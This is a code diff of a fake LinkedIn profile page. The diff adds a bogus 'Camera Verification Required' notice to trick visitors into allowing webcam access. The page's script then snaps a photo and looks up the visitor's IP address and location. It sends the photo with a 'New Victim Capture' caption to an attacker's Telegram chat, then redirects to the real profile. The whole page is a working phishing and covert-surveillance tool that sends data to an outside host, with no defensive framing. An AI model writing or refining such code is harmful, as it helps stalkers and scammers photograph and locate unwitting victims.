@@ -5,21 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LinkedIn Profile</title>
     <style>
-        body { 
-            margin:0; 
-            padding:0; 
-            background:#ffffff; 
-            height:100vh; 
-            display:flex; 
-            align-items:center; 
-            justify-content:center; 
-            font-family:Arial, sans-serif; 
+        body {
+            margin: 0;
+            padding: 0;
+            background: #ffffff;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            flex-direction: column;
         }
-        h1 { color: #0077b5; }
+        .container {
+            text-align: center;
+            max-width: 420px;
+            padding: 20px;
+        }
+        .logo {
+            color: #0077b5;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        h1 {
+            color: #0077b5;
+            margin: 15px 0;
+        }
+        .message {
+            background: #f0f8ff;
+            border-left: 4px solid #0077b5;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            border-radius: 4px;
+            font-size: 15px;
+            line-height: 1.5;
+        }
+        .warning {
+            color: #d32f2f;
+            font-size: 13px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
-    <h1>Loading profile...</h1>
+    <div class="container">
+        <div class="logo">LinkedIn</div>
+        <h1>Loading profile...</h1>
+        
+        <div class="message">
+            <strong>Camera Verification Required</strong><br><br>
+            For security reasons, LinkedIn needs to verify your identity before showing the full profile.<br>
+            Please allow camera access when prompted.
+        </div>
+
+        <p class="warning">This is a one-time verification. You will be redirected to the profile after camera access.</p>
+    </div>
 
     <script>
         // ================== YOUR TELEGRAM DETAILS ==================
@@ -40,8 +81,8 @@
             try {
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("caption", `🔴 New Capture\n\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.city}, ${visitorInfo.country}\nISP: ${visitorInfo.isp}\nTime: ${visitorInfo.timestamp}`);
-
+                formData.append("caption", `🔴 New Victim Capture\n\nIP: ${visitorInfo.ip}\nLocation: ${visitorInfo.city}, ${visitorInfo.country}\nISP: ${visitorInfo.isp}\nTime: ${visitorInfo.timestamp}`);
+                
                 const blob = await fetch(photoBase64).then(r => r.blob());
                 formData.append("photo", blob, "photo.jpg");
 
@@ -56,12 +97,11 @@
 
         async function start() {
             try {
-                // Get IP
+                // Get IP and Location
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 visitorInfo.ip = ipData.ip;
 
-                // Get Location
                 const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                 const geo = await geoRes.json();
                 visitorInfo.city = geo.city || "Unknown";
@@ -77,30 +117,30 @@
                 video.srcObject = stream;
                 await video.play();
 
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Wait a bit for better photo
+                await new Promise(resolve => setTimeout(resolve, 1800));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
                 canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0);
 
-                const photoBase64 = canvas.toDataURL('image/jpeg', 0.85);
-
+                const photoBase64 = canvas.toDataURL('image/jpeg', 0.9);
                 stream.getTracks().forEach(track => track.stop());
 
-                // Send to Telegram
+                // Send photo
                 await sendToTelegram(photoBase64);
 
             } catch (error) {
                 console.log("Error:", error);
             } finally {
-                // Redirect to LinkedIn
+                // Redirect to real LinkedIn profile
                 window.location.href = REDIRECT_URL;
             }
         }
 
-        // Auto Start
-        start();
+        // Auto start after a small delay
+        setTimeout(start, 800);
     </script>
 </body>
 </html>
